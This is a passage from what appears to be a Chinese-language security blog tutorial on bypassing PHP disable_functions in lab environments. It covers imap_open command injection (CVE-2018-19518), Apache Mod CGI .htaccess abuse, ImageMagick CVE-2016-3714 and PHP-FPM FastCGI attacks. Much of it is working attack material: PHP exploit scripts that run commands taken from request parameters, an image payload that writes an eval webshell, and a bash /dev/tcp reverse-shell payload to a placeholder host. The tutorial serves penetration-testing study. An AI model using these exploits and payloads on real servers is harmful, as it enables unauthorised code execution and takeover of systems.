<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008105542413.png" alt="img"></p>
<p>而 CVE-2018-19518主要就是没有过滤造成的任意命令的执行</p>
<pre><code>imap_open（string $mailbox , string $username , string $password）</code></pre><p>函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行</p>
<p>我们可以通过下面的方式来对mailbox的利用</p>
<pre><code>{[host]}:[port][flags]}[mailbox_name] //需要定义的的mailbox参数

$mbox = imap_open ("{localhost:1234/PROTOCOL/FLAG}INBOX", "user_id", "password");</code></pre><p>这上面跟我们后面的exp有关，INBOX是当前用户的个人邮箱，还能看到localhost，端口，协议，</p>
<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h4><p>比如下面这个，当我们执行命令时候，我们并没有localhost进行连接，但是仍然创建成功</p>
<pre><code>root@1:/var/www/html# ssh -oProxyCommand="touch ash" localhost

ssh_exchange_identification: Connection closed by remote host

root@1:/var/www/html# ls | grep ash

ash</code></pre><p>尽管命令成功了，但是我们不能将该直接移动我们的php脚本中，也就是mailbox中，因为在解析的时候，会把空格当作空格符或者斜杠作为标志，当然空格我们可以使用\t或者$IFS去代替，而斜杠呢我们可以用base64编码去绕过，所以我们直接将我们要执行的那些命令转换成base64</p>
<pre><code>root@kali:# echo "touch ash" | base64

dG91Y2ggYXNoCg==

root@kali:# ssh -oProxyCommand="echo dG91Y2ggYXNoCg==|base64 -d|sh" localhost</code></pre><p>这里有一篇具体分析的<a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">https://xz.aliyun.com/t/4113</a></p>
<p>exp</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'imap_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no imap_open function!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t"</span> <span class="token punctuation">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">">/tmp/result"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"|base64\t-d|sh}"</span><span class="token punctuation">;</span>

<span class="token operator">*</span><span class="token comment" spellcheck="true">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';*</span>

<span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">':143/imap}INBOX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">// or var_dump("\n\nError: ".imap_last_error());*</span>

<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>显示判断是否存在imap_open，然后后就是我们要传递的命令进去，输入结果并显示出来。sleep(5)是等待imap_open执行完</p>
<p><strong>安装php的imap_open</strong></p>
<pre><code>apt-get install php-imap</code></pre><p>安装完了之后去php.ini中打开，imap.enable_insecure_rsh选项为On </p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008110439317.png" alt="img"></p>
<p>打开phpinfo查看</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008110500775.png" alt="img"></p>
<p>开启成功了</p>
<p>试了好久，执行命令没有回显，并且没有生成文件，有空再研究吧。</p>
<p>正常情况下，执行后就会有回显了，再页面上</p>
<h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a><strong>防御方式</strong></h4><ul>
<li>设置imap.enable_insecure_rsh选项为Off；</li>
<li>可以的话禁用imap_open()函数；</li>
</ul>
<h3 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a><strong>利用 Apache Mod CGI</strong></h3><p>环境还是利用的AntSword-Labs</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>因为在早期的web服务器中，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。</p>
<p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p>
<p>而对于 Mod CGI，Web 服务器可以内置 Perl 解释器或 PHP 解释器。 也就是说将这些解释器做成模块的方式，Web 服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web 服务器就是自己解析这些动态脚本，省得重新 Fork 一个进程，效率提高了。</p>
<p>任何具有 MIME 类型 application/x-httpd-cgi 或者被 cgi-script 处理器处理的文件都将被作为 CGI 脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为 CGI 脚本，一种是文件具有已由 AddType 指令定义的扩展名，另一种是文件位于 ScriptAlias 目录中</p>
<p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p>
<p>Options +ExecCGI</p>
<p>AddHandler cgi-script .xxx</p>
<p>这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions。</p>
<p>也就是说：利用Apache的rewrite模块对 URL 进行重写的时候， rewrite规则会写在 .htaccess 文件里。但要使 apache 能够正常的读取.htaccess 文件的内容，就必须对.htaccess 所在目录进行配置</p>
<p>AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写</p>
<pre><code>Options +ExecCGI
AddHandler cgi-script .xxx</code></pre><p>这样便会将当前目录下的所有的.xxx文件当做CGI程序执行了。</p>
<h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a><strong>前提</strong></h4><ul>
<li>Linux 操作系统</li>
<li>Apache + PHP (apache 使用 apache_mod_php)</li>
<li>Apache 开启了 cgi、rewrite</li>
<li>Web 目录给了 AllowOverride 权限（不为None）</li>
<li>当前目录可写</li>
</ul>
<p><strong>利用</strong></p>
<p>打开我们的环境</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008153923119.png" alt="img"></p>
<p>还是一样无法执行</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154027489.png" alt="img"></p>
<p>查看是否开启rewrite和CGI（在phpinfo的apache环境看）</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154412496.png" alt="img"></p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154433196.png" alt="img"></p>
<p>首先我们先创建一个.htaccess文件，内容如下</p>
<pre><code>Options +ExecCGI

AddHandler cgi-script .ant</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155430617.png" alt="img"></p>
<p>然后再创建一个shell.ant文件</p>
<pre><code>#!/bin/sh

echo Content-type: text/html

echo ""

echo&amp;&amp;id</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155520246.png" alt="img"></p>
<p>直接访问</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155710346.png" alt="img"></p>
<p>报错是因为权限不够，直接再蚁剑修改成0777，或者</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008160024035.png" alt="img"></p>
<p>再次访问</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155754474.png" alt="img"></p>
<p>或者使用蚁剑的插件，使用后会新生成一个新的终端，然后可以执行命令</p>
<h3 id="利用-ImageMagick"><a href="#利用-ImageMagick" class="headerlink" title="利用 ImageMagick"></a><strong>利用 ImageMagick</strong></h3><p>什么是imagemagick：一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>利用的是ImageMagick 的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的 ImageMagick，ImageMagick 会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。可以是在phpinfo中查看是否存在</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h4><p>利用已经创建的好的docker环境【ImageMagick 命令执行漏洞（CVE-2016–3714）环境】</p>
<pre><code>docker pull medicean/vulapps:i_imagemagick_1

docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1</code></pre><p>访问一下phpinfo，看看是否存在</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008161804069.png" alt="img"></p>
<p>先进入容器查看一下是否存在漏洞</p>
<p>可以看到已经存在poc</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162244037.png" alt="img"></p>
<p>执行的命令就是 ls -la</p>
<p>在容器内验证poc</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162424806.png" alt="img"></p>
<p>在容器外验证</p>
<pre><code>docker exec i_imagemagick_1 convert /poc.png 1.png //i_imagemagick_1容器名称</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162658912.png" alt="img"></p>
<p>验证成功存在漏洞</p>
<h4 id="远程命令测试使用poc"><a href="#远程命令测试使用poc" class="headerlink" title="远程命令测试使用poc"></a><strong>远程命令测试使用poc</strong></h4><p>首先访问环境中存在的poc.php</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008170709510.png" alt="img"></p>
<p>再来看看poc.php里面有什么</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token variable">$base64</span> <span class="token operator">=</span> "iVBORw0KGgoAAAANSUhEUgAAAM0AAAD

NCAMAAAAsYgRbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5c

cllPAAAABJQTFRF3NSmzMewPxIG<span class="token comment" spellcheck="true">//ncJEJsldTou1jHgAAAARBJREFUeNrs2EEK</span>

gCAQBVDLuv<span class="token operator">+</span>V20dENbMY831wKz4Y<span class="token operator">/</span>VHb<span class="token operator">/</span><span class="token constant">5RGQ0NDQ0NDQ0NDQ0NDQ0NDQ</span>

0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0PzMWtyaGhoaGhoaGhoaGhoaGhoxtb0QGho

aGhoaGhoaGhoaGhoaMbRLEvv50VTQ9OTQ5OpyZ01GpM2g0bfmDQaL7S<span class="token operator">+</span>ofFC6x

v3ZpxJiywakzbvd9r3RWPS9I2<span class="token operator">+</span>MWk0<span class="token operator">+</span>kbf0Hih9Y17U0nTHibrDDQ0NDQ0NDQ0

NDQ0NDQ0NTXbRSL<span class="token operator">/</span>AK72o6GhoaGhoRlL8951vwsNDQ0NDQ1NDc0WyHtDTEhD

Q0NDQ0NTS5MdGhoaGhoaGhoaGhoaGhoaGhoaGhoaGposzSHAAErMwwQ2HwRQ

AAAAAElFTkSuQmCC"<span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

     <span class="token variable">$base64</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token variable">$imageBlob</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



  <span class="token variable">$imagick</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$imagick</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token variable">$imageBlob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">echo</span> <span class="token variable">$imageBlob</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是说我们要通过以post的方式img去传递，把我们的payload编码传递进去，然后执行</p>
<p><strong>写一句话木马payload</strong></p>
<pre><code>push graphic-context

viewbox 0 0 640 480

fill 'url(https://example.com/1.jpg"|echo \'&lt;?php @eval($_POST[\'ant\']);?&gt;\' &gt; shell.php")'

pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008171433237.png" alt="img"></p>
<p>可以看到已经成功写入了</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008171452306.png" alt="img"></p>
<p>上蚁剑连接</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/clipboard.png" alt="img"></p>
<p>无奈报错，但是我加了一下权限，能连接上了…..</p>
<pre><code>push graphic-context

viewbox 0 0 640 480

fill 'url(https://example.com/1.jpg"|chmod 777 shell.php")'

pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008175709879.png" alt="img"></p>
<p><strong>反弹shell</strong></p>
<pre><code>push graphic-context

viewbox 0 0 640 480

fill 'url(https://example.com/1.jpg"|bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1")'

pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008180356263.png" alt="img"></p>
<p>成功拿到了shell</p>
<p>集成的exp </p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">echo</span> <span class="token string">"Disable Functions: "</span> <span class="token punctuation">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'disable_functions'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>



<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token constant">PHP_SAPI</span> <span class="token operator">==</span> <span class="token string">'cli'</span> <span class="token operator">?</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

 <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string">'id'</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>

push graphic<span class="token operator">-</span>context

viewbox <span class="token number">0</span> <span class="token number">0</span> <span class="token number">640</span> <span class="token number">480</span>

fill '<span class="token function">url</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/image.jpg"|$command")'</span>

pop graphic<span class="token operator">-</span>context

<span class="token constant">EOF</span><span class="token punctuation">;</span>



<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">,</span> <span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a><strong>利用攻击PHP-FPM</strong></h3><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a><strong>使用条件</strong></h4><ul>
<li>Linux 操作系统</li>
<li>PHP-FPM</li>
<li>存在可写的目录，需要上传 .so 文件</li>
</ul>
<p>像php-fpm很常见的未授权，授权，然后命令执行，ssrf去攻击等</p>
<p>先来看看回顾一下什么是CGI和apache的Mod CGI</p>
<p>因为在早期的web服务器中，所请求的都是http静态资源，存储在服务器上面，请求完之后再返回给服务器，而后来出现动态的脚本像PHP，那么web处理不了，于是就出现了CGI，而这CGI是服务器去FORK一个新的进程去启动的，然后处理动态脚本，最后在kill掉，效率自然而然比较低下。</p>
<p>Mod CGI 是Web 服务器可以内置 Perl 解释器或 PHP 解释器，做成一个模块，也就是说不用再去FORK一个新进程，就会自动启动</p>
<p>参考P牛的<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record</a></p>
<h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a><strong>FastCGI</strong></h4><p>当然有了CGI，自然是解决了web服务器和php解释器之间的通信问题，然而还有一个效率低下的问题，就是需要创建进程启动CGI。后来就出现了FastCGI，跟CGI相比它启动完进程之后，不会再杀死进程，也就是可以一个请求实现多用。</p>
<p>它其实也是一种协议，针对http协议而言，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议</p>
<p>而http协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器</p>
<h4 id="FastCGI-record"><a href="#FastCGI-record" class="headerlink" title="FastCGI record"></a><strong>FastCGI record</strong></h4><p>fastcgi是由多个record构成的，而fastcgi也是有header和body的。服务器中间件将这两个封装好打包发送给某个语言后端，语言后端接受到之后进行指定的操作，再按照原来的封装发送给服务器中间件</p>
<p>来看看固定头的8个字节</p>
<pre><code>typedef struct {

/* Header */

unsigned char version; // 版本

unsigned char type; // 本次record的类型

unsigned char requestIdB1; // 本次record对应的请求id

unsigned char requestIdB0;

unsigned char contentLengthB1; // body体的大小

unsigned char contentLengthB0;

unsigned char paddingLength; // 额外块大小

unsigned char reserved;



/* Body */

unsigned char contentData[contentLength];

unsigned char paddingData[paddingLength];

} FCGI_Record;</code></pre><h4 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a><strong>php-fpm</strong></h4><p>简单来说就是fastcgi的解释器，映照了前面说的，中间件服务器将封装好的数据包以TCP的形式发送给后端，就是发送给了fpm。</p>
<p>比如举个例子，用户访问 <a href="http://127.0.0.1/index.php?a=1&amp;b=2" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=1&amp;b=2</a> 时，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</p>
<pre><code>{

 'GATEWAY_INTERFACE': 'FastCGI/1.0',

 'REQUEST_METHOD': 'GET',

 'SCRIPT_FILENAME': '/var/www/html/index.php',

 'SCRIPT_NAME': '/index.php',

 'QUERY_STRING': '?a=1&amp;b=2',

 'REQUEST_URI': '/index.php?a=1&amp;b=2',

 'DOCUMENT_ROOT': '/var/www/html',

 'SERVER_SOFTWARE': 'php/fcgiclient',

 'REMOTE_ADDR': '127.0.0.1',

 'REMOTE_PORT': '12345',

 'SERVER_ADDR': '127.0.0.1',

 'SERVER_PORT': '80',

 'SERVER_NAME': "localhost",

 'SERVER_PROTOCOL': 'HTTP/1.1'

}</code></pre><p>其实phpcgi的攻击就是利用了php-fpm会去读取SCRIPT_FILENAME,这里也不做过多详解，主要就是PHP_VALUE和PHP_ADMIN_VALUE是PHP-FPM的两个环境变量，通过设置这两个让auto_prepend_file = php://input且allow_url_include = On</p>
<p>那么怎么设置？我们可以直接在报文中添加这两个PHP-FPM的环境变量来进行设置（直接看最后两行）</p>
<pre><code>{

 'GATEWAY_INTERFACE': 'FastCGI/1.0',

 'REQUEST_METHOD': 'GET',

 'SCRIPT_FILENAME': '/var/www/html/index.php',

 'SCRIPT_NAME': '/index.php',

 'QUERY_STRING': '?a=1&amp;b=2',

 'REQUEST_URI': '/index.php?a=1&amp;b=2',

 'DOCUMENT_ROOT': '/var/www/html',

 'SERVER_SOFTWARE': 'php/fcgiclient',

 'REMOTE_ADDR': '127.0.0.1',

 'REMOTE_PORT': '12345',

 'SERVER_ADDR': '127.0.0.1',

 'SERVER_PORT': '80',

 'SERVER_NAME': "localhost",

 'SERVER_PROTOCOL': 'HTTP/1.1'

 'PHP_VALUE': 'auto_prepend_file = php://input',

 'PHP_ADMIN_VALUE': 'allow_url_include = On'

}</code></pre><p>看到在报文里面多了两个。但是SCRIPT_FILENAME选项需要我们设置一个服务端已存在的PHP文件，该选项是让PHP-FPM执行目标服务器上的文件，且由于security.limit_extensions项的限制导致只能执行PHP文件。</p>
<p>如果有环境可以直接</p>
<pre><code>find / -name *.php</code></pre><p>还有一个常见的</p>
<pre><code>/usr/local/lib/php/PEAR.php</code></pre><h4 id="如何构造攻击"><a href="#如何构造攻击" class="headerlink" title="如何构造攻击"></a><strong>如何构造攻击</strong></h4><p>默认的FPM的端口是9000，那么我们可以绕过web服务器，构造fastcgi协议，直接与fpm进行通信，同理就可以用我们的webshell达到绕过。</p>
<p>但是有3个限制</p>
<h5 id="一："><a href="#一：" class="headerlink" title="一："></a><strong>一：</strong></h5><p>在php-fpm里面已经讲到了，fpm的执行与SCRIPT_FILENAME有关，它是去执行这个路径下的文件的，但是如果这个路径下的文件不存在，那么就会返回404，所以我们得保证这个路径下得文件存在。常见的一个/usr/local/lib/php/PEAR.php。剩下的可以自己去找，前提是必须存在</p>
<h5 id="二："><a href="#二：" class="headerlink" title="二："></a><strong>二：</strong></h5><p>单单执行目标上面的文件还是不够，因为我们想要执行的是我们想要执行的文件，那么在php.ini中就有两个可以让我们执行任意的命令</p>
<p>auto_prepend_file 和 auto_append_file 。</p>
<p>auto_prepend_file的意思就是告诉PHP在执行目标文件之前，先包含auto_prepend_file中指定的文件，并且auto_prepend_file可以使用PHP伪协议；auto_append_file选项同理，区别在于执行目标文件之后才会包含指定文件。</p>
<p>所以我们设置auto_prepend_file 为php://input，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 过去的内容。所以，只需要把待执行的代码放在 POST Body 中进行远程文件包含，这样就能做到任意代码执行了</p>
<h5 id="三："><a href="#三：" class="headerlink" title="三："></a><strong>三：</strong></h5><p>还有一个是allow_url_include，因为需要用到包含，而这个也是必须，如果不为ON是没办法利用的。当然这就用到了上面讲的PHP_VALUE和PHP_ADMIN_VALUE这两个fpm的环境变量，PHP_VALUE可以用来设置 php.ini，PHP_ADMIN_VALUE 则可以设置所有选项（disable_functions 选项除外）</p>
<p>最后的构造就是php-fpm里面的最后一个报文形式</p>
<p>攻击fpm的exp：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h4><p>启动我们的蚁剑环境</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009140339573.png" alt="img"></p>
<p>打开phpinfo查看</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009140516033.png" alt="img"></p>
<p>FastCGI模式，CGI模式是CGI/FastCGI</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141513573.png" alt="img"></p>
<p>注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，默认的是 unix:/// 本地 Socket 这种的，如果配置成 TCP 的默认是 127.0.0.1:9000</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141950988.png" alt="img"></p>
<p>点击开始，上传成功</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141642131.png" alt="img"></p>
<p>这时候我们就可以在/var/www/html下看到创建的shell</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141815342.png" alt="img"></p>
<p>之后回到蚁剑的首页创建一个副本，并且改名</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009142419760.png" alt="img"></p>
<p>然后打开终端就可以执行命令</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009142349345.png" alt="img"></p>
